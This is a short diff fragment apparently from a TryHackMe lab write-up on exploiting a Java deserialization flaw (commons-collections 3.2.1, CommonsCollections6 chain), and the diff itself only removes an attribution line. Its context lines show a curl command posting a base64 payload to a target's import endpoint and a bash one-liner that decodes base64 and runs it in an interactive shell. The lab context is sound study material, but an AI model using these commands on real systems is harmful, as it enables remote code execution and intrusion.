@@ -18,4 +18,3 @@ curl -X POST --data-binary @payload.b64 http://<TARGET>:<RPORT>/<import-endpoint
 bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}
 ```
 
-— TryHackMe / IronHold (commons-collections 3.2.1, CommonsCollections6 gadget chain)
